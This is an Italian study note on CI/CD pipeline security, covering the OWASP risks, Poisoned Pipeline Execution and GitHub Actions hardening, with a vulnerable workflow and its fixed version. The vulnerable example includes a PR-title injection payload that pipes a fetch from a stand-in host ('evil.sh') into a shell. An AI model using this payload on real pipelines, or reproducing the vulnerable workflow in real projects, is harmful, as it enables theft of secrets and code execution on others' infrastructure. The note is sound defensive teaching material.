---
tipo: concetto
tag: [devsecops]
fase: 3
fonti: 3
aggiornato: 2026-06-28
stato: maturo
aliases: ["Sicurezza CI-CD Pipeline"]
---

# Sicurezza CI-CD Pipeline

## In breve
La pipeline **CI/CD** e un bersaglio ad altissimo valore: ha accesso al codice, ai segreti di deploy, ai registri di artefatti e spesso a credenziali cloud privilegiate. Compromettere la pipeline significa compromettere ogni cosa che essa produce. L'OWASP **Top 10 CI/CD Security Risks** classifica le minacce principali, dalla configurazione insufficiente del flusso (CICD-SEC-1) all'igiene insufficiente delle credenziali. L'attacco emblematico e la **Poisoned Pipeline Execution (PPE)**: iniettare comandi nel processo di build sfruttando input controllabili dall'attaccante.

## Come funziona
Una pipeline e un interprete che esegue codice e configurazioni provenienti dal repository. I punti deboli ricorrenti:

- **Trigger insicuri**: `pull_request_target` in GitHub Actions gira con i segreti del repo base ma puo eseguire codice della PR fork (D-PPE / I-PPE).
- **Espressioni non sanificate**: interpolare `${{ github.event.* }}` (titolo PR, branch name, commit message) dentro uno script `run:` permette **script injection**.
- **Permessi del `GITHUB_TOKEN` troppo ampi**: default `write` consente push, modifica release, commento.
- **Azioni di terze parti non pinnate**: usare `actions/checkout@v4` invece di un SHA permette al manutentore (o a chi lo compromette) di alterare il comportamento.
- **Runner self-hosted persistenti**: condivisi tra job, conservano stato e segreti tra esecuzioni; un job malevolo lascia backdoor per i successivi.

## Esempi
Workflow vulnerabile a script injection tramite titolo della PR:

```yaml
# .github/workflows/vulnerable.yml — NON FARE QUESTO
name: pr-check
on:
  pull_request_target:        # gira con segreti del repo base
    types: [opened]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Nuova PR: ${{ github.event.pull_request.title }}"
          # Titolo PR: a"; curl evil.sh | sh; echo "
          # -> command injection nello shell del runner
```

Versione corretta: niente `pull_request_target`, input passato via env e azioni pinnate a SHA:

```yaml
name: pr-check
on: pull_request
permissions:
  contents: read              # least privilege sul GITHUB_TOKEN
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4 pinned
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Nuova PR: $PR_TITLE"   # quoting protegge dall'injection
```

## Mitigazione e difesa
- **Least privilege** sul token: `permissions: contents: read` come default, elevare solo dove serve.
- **Pin delle action al commit SHA**, non al tag mutabile; aggiornare via Dependabot.
- Evitare `pull_request_target`; se necessario, separare il job che esegue codice della fork da quello con accesso ai segreti.
- **Runner effimeri** (one-shot, usa-e-getta) invece di self-hosted persistenti.
- **OIDC** per autenticazione cloud al posto di chiavi long-lived nei secret.
- Branch protection, required reviews e protezione degli environment per i deploy.

## Lab
- [[TryHackMe]] - room su CI/CD security e GitHub Actions.
- Lab: deliberately vulnerable pipeline come **CICD-goat** (Cider Security) per esercitarsi sui 10 rischi OWASP.
- Esercizio: trovare e sfruttare uno script injection in un workflow di test.

## Domande
1. **Cos'e la Poisoned Pipeline Execution?** L'esecuzione di comandi arbitrari nella pipeline sfruttando input controllati dall'attaccante (config, branch, PR).
2. **Perche `pull_request_target` e pericoloso?** Espone i segreti del repo base a codice proveniente da fork non fidate.
3. **Perche pinnare le action a SHA?** Un tag e mutabile: il manutentore (o chi lo compromette) puo cambiare il codice eseguito senza che te ne accorga.
4. **Cosa rende rischioso un runner self-hosted?** Persiste stato e segreti tra job; un job malevolo puo contaminare i successivi.
5. **A cosa serve OIDC nella pipeline?** A ottenere credenziali cloud temporanee senza memorizzare chiavi a lunga durata nei secret.

## Approfondimento livello esperto
La PPE si articola in tre varianti: **D-PPE** (direct, l'attaccante modifica il file di pipeline stesso), **I-PPE** (indirect, controlla file che la pipeline esegue ma non la definizione, es. test o build script) e **Public-PPE** (su repo pubblici via PR). L'**abuso del runner self-hosted** e una catena classica: una PR fork su un progetto open source con runner self-hosted permette di eseguire codice direttamente sull'infrastruttura del manutentore, da cui pivot verso la rete interna. Il caso **Codecov** (2021) mostra l'altra direzione: lo script bash di upload, alterato, esfiltrava le variabili d'ambiente (segreti CI) di migliaia di progetti che lo eseguivano in pipeline. La difesa esperta combina runner effimeri, segregazione di rete, autenticazione OIDC e firma degli artefatti con **cosign** per garantire che cio che esce dalla pipeline sia esattamente cio che e entrato, con provenienza verificabile (vedi [[05 SBOM e SLSA|SBOM e SLSA]]).

## Collegamenti
- [[01 Fondamenti DevSecOps|Fondamenti DevSecOps]]
- [[03 SAST, DAST e SCA|SAST, DAST e SCA]]
- [[06 Secrets Management e IaC Security|Secrets Management e IaC Security]]
- [[Container Security (Docker)]]
- [[Kubernetes Security (RBAC, escape)]]

## Fonti
- https://owasp.org/www-project-top-10-ci-cd-security-risks/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- https://www.cisa.gov/resources-tools/resources/defending-ci-cd-environments
